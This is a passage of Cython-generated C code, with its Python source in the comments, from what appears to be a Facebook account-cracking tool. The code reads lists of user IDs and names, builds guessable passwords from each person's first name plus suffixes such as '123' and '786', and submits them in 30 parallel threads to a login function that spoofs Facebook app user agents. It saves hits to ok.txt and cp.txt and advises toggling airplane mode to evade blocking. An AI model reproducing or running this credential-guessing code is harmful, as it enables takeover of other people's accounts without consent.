              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 1018, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1018, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1018, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1018, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 1018, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 1018, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":1019
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1019, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_6 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_6)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_6);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_6, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1019, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1019, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":1020
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1020, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":1021
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1021, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1021, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1021, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1021, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1021, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;

                /* "libme.pyx":1020
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":1022
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1022, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1022, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1022, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":1023
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1023, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1023, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1023, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1023, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1023, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":1022
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":1025
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1025, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1025, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1025, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1025, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1025, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":1026
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __f_james__(self, uid, pwx):
 * 		ua = random.choice([
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1026, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1026, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1026, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1026, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1026, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_6 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1026, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":1017
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":1013
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__me__nnn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 1013, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1013, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 1013, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 1013, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 1013, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1013, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":1012
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":990
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__me__nnn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pastefile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":1027
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_65__f_james__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_65__f_james__ = {"__f_james__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5libme_5James_65__f_james__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5libme_5James_65__f_james__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__f_james__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_uid,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_uid)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__f_james__", 1, 3, 3, 1); __PYX_ERR(0, 1027, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__f_james__", 1, 3, 3, 2); __PYX_ERR(0, 1027, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__f_james__") < 0)) __PYX_ERR(0, 1027, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_uid = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__f_james__", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 1027, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("libme.James.__f_james__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5libme_5James_64__f_james__(__pyx_self, __pyx_v_self, __pyx_v_uid, __pyx_v_pwx);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_64__f_james__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_kwargs = NULL;
